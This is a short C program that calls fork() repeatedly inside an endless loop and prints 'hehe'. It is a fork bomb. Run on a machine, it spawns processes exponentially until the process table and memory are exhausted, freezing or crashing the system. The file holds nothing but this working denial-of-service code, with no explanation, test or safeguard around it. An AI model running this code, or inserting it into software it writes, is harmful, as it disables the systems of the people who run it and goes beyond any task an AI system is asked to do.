#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void hehe(){
    printf("hehe");
}

int main(){
    while(1){
        fork();
        if (fork()==0){
            fork();
            hehe();
        }
        else {
            fork();
            hehe();
        }
    }
}